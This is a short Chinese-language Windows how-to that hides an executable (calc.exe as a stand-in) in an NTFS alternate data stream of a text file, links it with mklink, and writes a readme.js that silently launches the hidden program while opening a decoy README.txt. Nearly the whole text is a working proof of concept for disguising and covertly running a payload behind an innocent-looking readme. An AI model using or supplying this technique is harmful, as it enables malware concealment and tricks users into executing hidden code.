	创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。
	将程序写入文件流（此处用calc.exe）
	>type calc.exe > test.txt:calc.exe
	使用mklink创建文件链接：
	>mklink config.txt test.txt:calc.exe
	创建readme.txt，文件内容随便。设置为隐藏。
	创建readme.js，内容如下：
	var objShell = new ActiveXObject("shell.application");
	objShell.ShellExecute("cmd.exe", "/c config.txt", "", "open", 0);
	objShell.ShellExecute("README.txt", "", "", "open", 1);
	执行readme.js，运行calc.exe ，打开readme.txt